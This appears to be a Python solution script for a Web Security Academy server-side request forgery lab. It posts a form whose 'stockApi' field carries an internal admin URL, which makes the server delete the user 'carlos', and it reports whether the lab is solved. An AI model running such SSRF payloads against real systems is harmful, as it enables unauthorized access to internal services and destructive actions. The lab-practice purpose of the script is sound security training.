import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

vuln_url = 'https://0a0400c703bb51168034851f004000fa.web-security-academy.net/product/stock' #check sotck path vulnerable to SSRF
del_carlos_url = 'http://127.0.0.1/admin/delete?username=carlos'

s = requests.session()
data = {'stockApi':del_carlos_url}


def delete_user(url):
    res = s.post(url, proxies=proxies, verify=False, data=data, allow_redirects=False)
    if res.status_code == 302 and res.headers.get("Location") == '/admin' :
        print("[+] Lab solved: User carlos deleted successfully")
    else:
        print("[-] Faild to delete user carlos")
        print(f"Status Code: {res.status_code}")
        print(res.text)

if __name__ == "__main__":
    print("Deleting carlos user...")
    delete_user(vuln_url)